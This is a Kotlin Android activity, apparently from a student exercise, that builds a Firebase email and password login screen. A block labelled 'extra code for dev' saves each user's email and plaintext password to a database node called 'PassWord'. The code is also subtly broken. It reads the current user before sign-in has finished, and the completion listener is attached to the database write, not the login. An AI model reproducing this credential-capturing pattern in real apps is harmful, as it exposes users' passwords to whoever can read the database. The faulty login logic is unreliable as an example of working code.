package com.example.cse227unit1

import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.FirebaseDatabase

class MainActivity2c2 : AppCompatActivity() {
    lateinit var auth : FirebaseAuth
    lateinit var email : EditText
    lateinit var pass : EditText
    lateinit var login : Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main_activity2c2)

        auth = FirebaseAuth.getInstance()

        email= findViewById<EditText>(R.id.etEmail)
        pass= findViewById<EditText>(R.id.etPassword)
        login= findViewById<Button>(R.id.btnLogin)


        login.setOnClickListener {
            val s = email.text.toString().trim() // .trim() removes extra spaces
            val p = pass.text.toString().trim()

            // 3. Check logic
            if (s.isNotEmpty() && p.isNotEmpty()) {
                LoginDATA(s, p)
            } else {
                Toast.makeText(this, "Dekho bhai, fields empty hain", Toast.LENGTH_LONG).show()
            }
        }

    }
    fun LoginDATA(e:String, p: String) {


        auth.signInWithEmailAndPassword(e, p)

        // extra code for dev{
        val hm = HashMap<String, Any>()
        hm.put("Email", e)
        hm.put("Pass", p)
        val uid = auth.currentUser!!.uid  // eek uid number generate kar dega
        val db = FirebaseDatabase.getInstance().getReference("PassWord")
        db.child(uid).setValue(hm)
    //} extra code for dev


            .addOnCompleteListener {  task ->
                if(task.isSuccessful)
                {
                    Toast.makeText(this, "You Login", Toast.LENGTH_LONG).show()

                }
                else{
                    Toast.makeText(this, " Not Login", Toast.LENGTH_LONG).show()

                }

            }
    }




    }
